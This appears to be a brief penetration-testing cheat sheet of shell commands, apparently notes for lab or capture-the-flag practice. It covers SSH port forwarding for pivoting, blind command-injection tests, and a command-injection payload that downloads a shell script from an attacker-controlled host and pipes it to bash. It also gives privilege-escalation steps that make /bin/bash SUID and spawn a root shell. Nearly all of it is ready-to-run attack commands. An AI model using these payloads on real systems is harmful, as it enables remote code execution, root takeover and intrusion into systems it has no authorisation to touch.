## Pivoting / Internal Services

```bash
ssh -L <LPORT>:127.0.0.1:<RPORT> user@IP
```

---

## Permissions / Ownership

```bash
ls -ld <folder>
```

---

## Command Injection Testing

### Silent output → write to file

```bash
$(id > /tmp/whoami)
```

Then:

```bash
cat /tmp/whoami
```

---

## Command Injection (real payload style)

```bash
$(curl http://<YOUR_IP>:8000/shell.sh | bash)
```

---

## Privilege Escalation (SUID bash)

### Make bash SUID

```bash
chmod +s /bin/bash
```

### Spawn root shell

```bash
/bin/bash -p
```

---
## Users and groups

### Check a user's group

```bash
groups
```

### Check what folders a group can read

```bash
find / -type d -group deployers 2>/dev/null
```


